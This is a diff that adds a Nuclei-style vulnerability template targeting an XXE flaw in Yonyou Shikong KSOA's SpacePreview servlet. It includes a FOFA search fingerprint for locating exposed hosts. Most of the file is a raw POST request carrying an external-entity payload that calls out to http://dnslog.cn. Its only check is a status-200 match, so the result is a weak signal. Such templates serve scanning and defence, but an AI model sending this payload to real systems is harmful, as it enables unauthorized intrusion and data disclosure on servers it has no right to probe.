@@ -1,0 +1,32 @@
+id: poc-oqhyvqd8zufp15vn
+info:
+  name: 用友时空-KSOA com-sksoft-common-portal XXE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oqhyvqd8zufp15vn'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oqhyvqd8zufp15vn
+    fofa: body="productKSOA.jpg"
+http:
+- raw:
+  - 'POST /servlet/com.sksoft.common.portal.SpacePreview HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    Content-Type: text/xml
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+
+
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dnslog.cn"> ]><foo>&xxe;</foo>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
